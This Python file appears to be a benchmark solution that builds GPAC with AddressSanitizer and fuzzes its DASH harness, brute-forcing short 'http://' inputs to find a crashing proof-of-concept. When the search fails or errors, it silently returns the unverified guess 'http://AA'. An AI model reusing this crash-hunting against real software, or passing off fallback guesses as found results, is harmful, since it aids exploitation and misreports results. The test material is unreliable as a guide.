import os
import sys
import tarfile
import subprocess
import tempfile
import shutil
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        base_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(path=base_dir)
            
            src_root = base_dir
            entries = os.listdir(base_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(base_dir, entries[0])):
                src_root = os.path.join(base_dir, entries[0])
            
            # 2. Configure and Build
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            san_flags = '-fsanitize=address -g'
            env['CFLAGS'] = san_flags
            env['CXXFLAGS'] = san_flags
            env['LDFLAGS'] = san_flags

            configure_script = os.path.join(src_root, 'configure')
            if os.path.exists(configure_script):
                # Configure for static build to simplify linking
                subprocess.run(
                    [configure_script, '--static-mp4box', '--disable-shared', '--disable-x11', '--disable-sdl', '--disable-oss-audio'],
                    cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 3. Locate Library and Fuzzer
            lib_path = None
            for root, _, files in os.walk(src_root):
                if 'libgpac_static.a' in files:
                    lib_path = os.path.join(root, 'libgpac_static.a')
                    break
            
            if not lib_path:
                for root, _, files in os.walk(src_root):
                    for f in files:
                        if f.endswith('.a') and 'gpac' in f:
                            lib_path = os.path.join(root, f)
                            break
                    if lib_path: break
            
            fuzzer_src = None
            candidates = []
            for root, _, files in os.walk(src_root):
                for f in files:
                    if f.endswith('.c') and 'fuzz' in f:
                        candidates.append(os.path.join(root, f))
            
            # Prioritize dash fuzzer based on task description
            for c in candidates:
                if 'dash' in os.path.basename(c):
                    fuzzer_src = c
                    break
            
            if not fuzzer_src and candidates:
                fuzzer_src = candidates[0]
            
            # Fallback if compilation artifacts aren't found
            if not fuzzer_src or not lib_path:
                return b'http://AA'

            # 4. Compile Harness
            runner_path = os.path.join(base_dir, 'runner.c')
            with open(runner_path, 'w') as f:
                f.write(r'''
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size);

int main(int argc, char **argv) {
    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = (uint8_t*)malloc(sz);
    if (!buf) { fclose(f); return 0; }
    fread(buf, 1, sz, f);
    fclose(f);
    LLVMFuzzerTestOneInput(buf, sz);
    free(buf);
    return 0;
}
''')

            exe_path = os.path.join(base_dir, 'fuzz_app')
            include_dir = os.path.join(src_root, 'include')
            
            cmd = ['clang', san_flags, runner_path, fuzzer_src, '-o', exe_path, f'-I{include_dir}', lib_path, '-lz', '-lpthread', '-lm']
            subprocess.run(cmd, cwd=src_root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 5. Fuzz
            # Vulnerability is likely in short string parsing (9 bytes)
            # Try http:// prefixes combined with other chars
            chars = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/:._-%'
            
            # Check length 9 permutations starting with http://
            base = b'http://'
            if len(base) < 9:
                remaining = 9 - len(base)
                # Try brute forcing the remaining characters
                import itertools
                for p in itertools.product(chars, repeat=remaining):
                    payload = base + bytes(p)
                    if self.run_test(exe_path, payload):
                        return payload

            # General fuzzing fallback
            start_t = time.time()
            while time.time() - start_t < 45:
                length = random.randint(1, 15)
                payload = bytes([random.choice(chars) for _ in range(length)])
                if self.run_test(exe_path, payload):
                    return payload
            
            return b'http://AA'
            
        except Exception:
            return b'http://AA'
        finally:
            shutil.rmtree(base_dir)

    def run_test(self, exe, payload):
        if not os.path.exists(exe):
            return False
        with tempfile.NamedTemporaryFile(delete=False) as tf:
            tf.write(payload)
            tf.close()
            try:
                res = subprocess.run([exe, tf.name], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
                if res.returncode != 0:
                    if b'AddressSanitizer' in res.stderr:
                        return True
            except:
                pass
            finally:
                if os.path.exists(tf.name):
                    os.unlink(tf.name)
        return False
